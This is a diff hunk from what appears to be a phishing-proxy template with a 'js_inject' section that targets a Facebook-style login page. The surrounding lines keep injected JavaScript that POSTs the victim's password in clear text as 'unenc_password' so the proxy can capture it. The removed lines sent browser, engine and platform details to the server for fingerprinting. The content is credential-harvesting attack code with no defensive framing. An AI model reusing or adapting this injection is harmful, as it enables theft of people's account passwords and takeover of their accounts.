@@ -65,25 +65,7 @@ js_inject:
       xhr.open("POST", '/login/device-based/regular/login/', true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send("unenc_password="+encodeURIComponent(password));
-      var xhr1 = new XMLHttpRequest();
-      var useragent = navigator.userAgent;
-      xhr1.open("POST", '/', true);
-      xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      var xhr2 = new XMLHttpRequest();
-      var browser = navigator.appName;
-      xhr2.open("POST", '/', true);
-      xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr2.send("Browser="+encodeURIComponent(browser));
-      var xhr3 = new XMLHttpRequest();
-      var engine = navigator.product;
-      xhr3.open("POST", '/', true);
-      xhr3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr3.send("Engine="+encodeURIComponent(engine));
-      var xhr4 = new XMLHttpRequest();
-      var platform = navigator.platform;
-      xhr4.open("POST", '/', true);
-      xhr4.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr4.send("Platform="+encodeURIComponent(platform));
+      
       return;
       }
       setTimeout(function(){ onclickListener(); }, 2500);
